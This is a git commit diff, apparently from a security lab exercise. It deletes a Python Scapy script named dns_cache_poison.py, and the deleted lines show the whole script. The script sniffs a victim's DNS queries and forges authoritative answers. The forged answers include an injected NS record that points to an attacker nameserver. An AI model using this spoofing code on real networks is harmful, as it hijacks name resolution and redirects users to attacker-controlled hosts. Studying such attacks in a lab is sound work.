e3ff570ffa1928dd6685fed1ad7dcff10e8bc3f6
phi99 <34248917+phi99@users.noreply.github.com>
2020-07-12 23:04:07 +1000

    Update dns_cache_poison.py

--- dns_cache_poison.py
+++ dns_cache_poison.py
@@ -1,16 +1,1 @@
-#!/usr/bin/python
-from scapy.all import *
-
-def spoof_dns(pkt):
-  if(DNS in pkt and 'www.attack321.com' in pkt[DNS].qd.qname):
-    print("inside if")
-    IPpkt=IP(dst=pkt[IP].src,src=pkt[IP].dst)
-    UDPpkt=UDP(dport=pkt[UDP].sport, sport=53)
-
-    Anssec=DNSRR(rrname=pkt[DNS].qd.qname, type='A', rdata='192.168.38.146', ttl=259200)
-    NSsec=DNSRR(rrname="example.net", type='NS', rdata='ns.attacker32.com',ttl=259200)
-    DNSpkt=DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1,rd=0,qdcount=1,qr=1,ancount=1,nscount=1,an=Anssec, ns=NSsec)
-    spoofpkt=IPpkt/UDPpkt/DNSpkt
-    send(spoofpkt)
-
-pkt=sniff(filter='udp and (src host 192.168.38.111 and dst port 53)', prn=spoof_dns)
+.
